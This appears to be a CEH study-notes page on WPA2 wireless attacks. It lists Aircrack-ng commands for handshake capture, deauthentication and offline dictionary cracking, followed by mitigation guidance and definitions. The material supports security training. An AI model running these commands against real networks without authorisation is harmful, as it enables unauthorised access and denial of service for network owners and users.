# Module 16 — Hacking Wireless Networks

## Overview
WPA2 wireless security assessment covering handshake capture and offline key cracking, plus enterprise WLAN hardening guidance.

## Learning Objectives
- Capture a WPA2 4-way handshake
- Perform offline dictionary/brute-force cracking of a captured handshake using Aircrack-ng

## Labs Completed
- Lab 2 — Crack a WPA2 Network using Aircrack-ng

## Tools & Technologies
- Aircrack-ng suite (airmon-ng, airodump-ng, aireplay-ng)
- Wireshark

## Key Commands / Techniques
```bash
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon
aireplay-ng --deauth 5 -a <BSSID> wlan0mon   # own/authorized network only
aircrack-ng -w rockyou.txt -b <BSSID> capture-01.cap
```

## Sample Payloads / Test Strings
```
N/A for this module.
```
> All commands and payloads above were executed strictly within EC-Council's isolated CEH iLabs cyber range against consenting lab targets, for educational and certification purposes only.

## Detection & Mitigation
- Migrate from WPA2 to WPA3-SAE which resists offline dictionary attacks
- Enforce long, high-entropy pre-shared keys or move to 802.1X/EAP enterprise authentication
- Disable WPS which is vulnerable to PIN brute-forcing
- Deploy Wireless IDS (WIDS) to detect deauthentication floods and rogue APs
- Segment guest/IoT wireless networks from corporate VLANs

## Key Definitions
| Term | Definition |
|---|---|
| **4-Way Handshake** | The WPA/WPA2 authentication exchange between client and AP used to derive session keys — capturable and crackable offline if the PSK is weak. |
| **Deauthentication Attack** | Forcibly disconnecting a wireless client to capture a fresh handshake or perform a DoS. |
| **WPA3-SAE** | Simultaneous Authentication of Equals — WPA3's password-authenticated key exchange, resistant to offline dictionary attacks. |

## References / Sources
- Aircrack-ng Documentation — https://www.aircrack-ng.org/documentation.html
- Wi-Fi Alliance — WPA3 Specification
- EC-Council CEH v13 Module 16

---
[⬅ Back to main README](../../README.md)
